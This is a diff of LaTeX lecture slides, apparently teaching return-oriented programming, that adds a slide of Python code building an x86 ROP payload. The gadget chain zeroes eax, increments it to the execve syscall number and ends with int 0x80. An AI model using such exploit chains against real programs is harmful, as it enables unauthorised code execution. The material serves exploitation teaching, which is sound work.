@@ -1,3 +1,17 @@
-\frametitle{Target Program and Compliation}
-    \bltCode{vuln.c}{c}{Target Program (stack protectors must be off)}{targetprogram}
-    \bltCommand{compliation.sh}{Compilation command}{comp}
+\frametitle{Generating the payload, init params, syscall}
+    \begin{lstlisting}[style=code, language=python]
+p += str(pack\('<I', 0x080506c0\)\) # xor eax, eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08049b2a\)\) # int 0x80
+print p
+    \end{lstlisting}
